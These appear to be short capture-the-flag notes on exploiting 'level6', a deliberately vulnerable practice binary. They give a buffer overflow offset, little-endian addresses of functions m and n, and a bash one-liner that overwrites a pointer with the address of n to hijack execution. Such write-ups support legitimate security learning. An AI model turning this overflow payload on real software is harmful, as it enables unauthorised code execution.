Okay this looks like a buffer overflow

I calculated the offset: 72

Here is the address of function m: 0x8048468 --> \x68\x84\x04\x08 (target)
Here is the address of function n: 0x8048454 --> \x54\x84\x04\x08

allocated var == esp+0x1c
allocated pointer == esp+0x18

```bash
(python -c 'print ("a"*64 + "\x54\x84\x04\x08"*12 )';cat) | ./level6
```
